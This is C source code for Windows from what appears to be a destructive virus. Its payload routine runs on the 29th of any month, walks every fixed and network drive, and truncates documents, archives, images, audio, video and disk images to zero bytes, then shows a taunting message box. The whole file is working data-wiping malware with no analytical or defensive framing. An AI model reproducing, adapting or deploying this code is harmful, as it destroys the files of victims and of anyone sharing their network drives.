#include "stdafx.h"
#include "prototypes.h"

//module for payload


void TrashDrive()
{
	//variables
	WIN32_FIND_DATA wfd;
	HANDLE hfind;

	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')	//most not be .. or .
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						TrashDrive();		//more death !
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					//die die die !
					if(memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"doc",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"zip",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"xls",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"doc",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"ppt",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"mdb",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"avi",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"mpg",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"pdf",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"mp3",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"iso",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"jpg",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"ace",3)==0 || memcmp(wfd.cFileName+lstrlen(wfd.cFileName)-3,
						"wmv",3)==0 )
					{
						CloseHandle(CreateFile(wfd.cFileName,GENERIC_WRITE,0,NULL,
							CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL));

						CloseHandle(CreateFile(wfd.cFileName,GENERIC_WRITE,0,NULL,
							TRUNCATE_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL));

					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}


void Payload()
{
	SYSTEMTIME xtime;
	char Drive[]="z:\\";
	UINT drive_type;

	GetLocalTime(&xtime);

	if(xtime.wDay==29)	//death time ?
	{
		do
		{
			drive_type=GetDriveType(Drive);	
		
			if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
			{
				if(SetCurrentDirectory(Drive)==TRUE)
				{
					TrashDrive();
					AddToLog(Drive,Duel_Log_Payload,TRUE);
				}
			}

			Drive[0]--;

		}while(Drive[0]!='b');

		MessageBox(NULL,"........",
			CopyRight,MB_ICONINFORMATION); //explain the user who fucked him

	}

	AddToLog("PayLoad Finished",Duel_Log_Custom,TRUE);
}